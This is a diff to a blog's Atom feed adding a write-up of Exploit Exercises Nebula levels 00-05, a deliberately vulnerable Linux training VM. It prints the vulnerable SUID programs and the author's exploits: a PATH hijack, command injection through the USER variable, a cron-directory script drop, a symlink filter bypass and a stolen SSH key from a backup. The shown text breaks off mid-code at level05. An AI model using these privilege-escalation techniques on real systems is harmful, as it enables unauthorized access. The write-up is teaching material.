@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2015-12-20T07:44:04-05:00</updated>
+  <updated>2016-01-09T10:07:37-05:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,1330 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula levels 00-10]]></title>
+    <link href="http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10/"/>
+    <updated>2016-01-09T09:50:44-05:00</updated>
+    <id>http://chousensha.github.io/blog/2016/01/09/exploit-exercises-nebula-levels-00-10</id>
+    <content type="html"><![CDATA[<p><a href="https://exploit-exercises.com/">exploit-exercises.com</a> provides a variety of virtual machines, documentation and challenges that can be used to learn about a variety of computer security issues such as privilege escalation, vulnerability analysis, exploit development, debugging, reverse engineering, and general cyber security issues.</p>
+
+<p>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at</p>
+
+<ul>
+<li>  SUID files</li>
+<li>  Permissions</li>
+<li>  Race conditions</li>
+<li>  Shell meta-variables</li>
+<li>  $PATH weaknesses</li>
+<li>  Scripting language weaknesses</li>
+<li>  Binary compilation failures</li>
+</ul>
+
+
+<p>At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.</p>
+
+<p>I am doing these levels by SSH&#8217;ing into the box, rather than directly in the Nebula terminal.</p>
+
+<p>Because my posts tend to become gigantic when I am focusing on a single challenge and it takes alot of time between them, I am going to break them up into smaller posts from now on, hence why I will cover only the levels from 00 to 10 in this post.</p>
+
+<!-- more -->
+
+
+<h3>Level00</h3>
+
+<p>This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
+
+<p>Alternatively, look at the find man page.</p>
+
+<p>To access this level, log in as level00 with the password of level00.</p>
+
+<p>After logging in, use the <em>find</em> command like this: <code>sudo find / -user flag00 -perm -4000 -print 2> /dev/null</code>. It prints all SUID files of the flag00 user and all error output is thrown in the black hole. So you will find the binary in <code>/rofs/bin/&hellip;/flag00</code>. You could also have looked for it directly, by noticing the rofs folder which doesn&rsquo;t normally exist in a Linux installation. Run the binary and you will see this message:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Congrats, now run getflag to get your flag!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run getflag and level complete:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level01</h3>
+
+<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
+
+<p>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is a SUID program owned by the flag01 user. When run it outputs <em>and now what?</em>. The <em>env</em> program is the one that actually invokes the <em>echo</em> command, and it doesn&rsquo;t use an absolute path. <em>env</em> runs a program in a modified environment and it looks in the  $PATH for the executable it&rsquo;s supposed to run. So we can make an executable of our own, name it <em>echo</em>, and add it to the path, so that it will take precedence over the others.</p>
+
+<p>First, let&rsquo;s see our current path:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ echo $PATH
+</span><span class='line'>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I&rsquo;m going to add my <em>echo</em> program to the path to be searched before anywhere else:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:~$ PATH=/tmp:$PATH
+</span><span class='line'>level01@nebula:~$ echo $PATH
+</span><span class='line'>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now create an <em>echo</em> file in <em>/tmp/</em>, that will run <em>getflag</em> (and make it executable):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/tmp$ cat echo 
+</span><span class='line'>/bin/getflag</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now go back and run the <em>flag01</em> binary:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level01@nebula:/home/flag01$ ./flag01 
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level02</h3>
+
+<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
+
+<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running this program outputs the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ ./flag02 
+</span><span class='line'>about to call system("/bin/echo level02 is cool")
+</span><span class='line'>level02 is cool</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The vulnerability is based on the fact that <em>getenv</em> is called on the USER environment variable. Since this is a SUID program, it&rsquo;s dangerous to trust the contents of the environment. The manpage actually provides a more secure alternative:</p>
+
+<blockquote><p>The secure_getenv() function is intended  for  use  in  general-purpose
+libraries  to  avoid vulnerabilities that could occur if set-user-ID or
+set-group-ID programs accidentally trusted the environment.</p></blockquote>
+
+<p>And we can exploit this by modifying the USER variable to make the program execute code of our choosing.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ export USER='pwned;/bin/getflag;'
+</span><span class='line'>level02@nebula:/home/flag02$ echo $USER
+</span><span class='line'>pwned;/bin/getflag;
+</span><span class='line'>level02@nebula:/home/flag02$ ./flag02 
+</span><span class='line'>about to call system("/bin/echo pwned;/bin/getflag; is cool")
+</span><span class='line'>pwned
+</span><span class='line'>You have successfully executed getflag on a target account
+</span><span class='line'>sh: is: command not found</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So why did this work? Remember this line:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Normally the USER would be level02, so it would look like this: <code>/bin/echo level02 is cool</code>. But we have control of what is returned by <em>getenv</em>. The injection was <code>pwned;/bin/getflag;</code>. So now it becomes this: <code>/bin/echo pwned;/bin/getflag; is cool</code>. The &ldquo;pwned&rdquo; is there just so that the <em>echo</em> command can print something. Then the <strong>;</strong> terminates the <em>echo</em> command and chains a new one, executing <em>getflag</em>. And the final <strong>;</strong> acts to comment out the rest of the string that was to be displayed (notice that bash treated the string as a command and reported that it couldn&rsquo;t find it).</p>
+
+<h3>Level03</h3>
+
+<p>Check the home directory of flag03 and take note of the files there.</p>
+
+<p>There is a crontab that is called every couple of minutes.</p>
+
+<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>
+
+<p>So we have a shell script and a directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03$ ls
+</span><span class='line'>writable.d  writable.sh
+</span><span class='line'>level03@nebula:/home/flag03$ cat writable.sh 
+</span><span class='line'>#!/bin/sh
+</span><span class='line'>
+</span><span class='line'>for i in /home/flag03/writable.d/* ; do
+</span><span class='line'>  (ulimit -t 5; bash -x "$i")
+</span><span class='line'>  rm -f "$i"
+</span><span class='line'>done
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the crontab is executing this script that executes every file in the writable.d directory and then removes it. Which means all we have to do is put a file of our own that calles <em>getflag</em> in the directory, and wait for cron to do its job:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03/writable.d$ cat &gt; exeme.sh 
+</span><span class='line'>/bin/getflag &gt; /tmp/readme</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now wait a bit and check the output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/tmp$ cat readme
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level04</h3>
+
+<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
+
+<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Right, so our goal is to read the token file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ls
+</span><span class='line'>flag04  token</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We don&rsquo;t have permission to do so directly. The flag04 executable can read files but it&rsquo;s conveniently coded not to read the token file. However, it&rsquo;s able to read other files just fine, provided we don&rsquo;t run into permission issues. So I went to <em>/tmp</em> and made a symbolic link that points to the token file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/tmp$ ln -s /home/flag04/token /tmp/readthis
+</span><span class='line'>level04@nebula:/tmp$ ls -l readthis 
+</span><span class='line'>lrwxrwxrwx 1 level04 level04 18 2015-09-04 01:17 readthis -&gt; /home/flag04/token</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now I had the flag04 binary read the symlink, and implicitly, the token:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/readthis
+</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I was at a loss at what to do with this string, but since our objective is to run <em>getflag</em>, I tried <code>su flag04</code> and used the token as password and it worked. Then it was all a matter of running <em>getflag</em>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ /bin/getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level05</h3>
+
+<p>Check the flag05 home directory. You are looking for weak directory permissions</p>
+
+<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>
+
+<p>Taking a look in the flag05 directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05$ ls -la 
+</span><span class='line'>total 5
+</span><span class='line'>drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
+</span><span class='line'>drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
+</span><span class='line'>drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+</span><span class='line'>-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+</span><span class='line'>-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
+</span><span class='line'>-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
+</span><span class='line'>drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, the <em>.backup</em> folder seems interesting, let&rsquo;s see what&rsquo;s in there:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05/.backup$ ls
+</span><span class='line'>backup-19072011.tgz
+</span><span class='line'>level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz 
+</span><span class='line'>.ssh/
+</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
+</span><span class='line'>.ssh/id_rsa.pub
+</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
+</span><span class='line'>tar: .ssh/id_rsa.pub: Cannot open: No such file or directory
+</span><span class='line'>.ssh/id_rsa
+</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
+</span><span class='line'>tar: .ssh/id_rsa: Cannot open: No such file or directory
+</span><span class='line'>.ssh/authorized_keys
+</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
+</span><span class='line'>tar: .ssh/authorized_keys: Cannot open: No such file or directory
+</span><span class='line'>tar: Exiting with failure status due to previous errors</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Oops! It looks like this is a backup of the <em>.ssh</em> folder but we only have read permissions in this directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/tmp$ ls -l /home/flag05/.backup/
+</span><span class='line'>total 2
+</span><span class='line'>-rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not a problem though! We can just move the archive to a directory where we have more freedom:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/
+</span><span class='line'>level05@nebula:/tmp$ tar vzxf backup-19072011.tgz 
+</span><span class='line'>.ssh/
+</span><span class='line'>.ssh/id_rsa.pub
+</span><span class='line'>.ssh/id_rsa
+</span><span class='line'>.ssh/authorized_keys</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now with flag05&rsquo;s private key, we can SSH to the machine and run <em>getflag</em>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
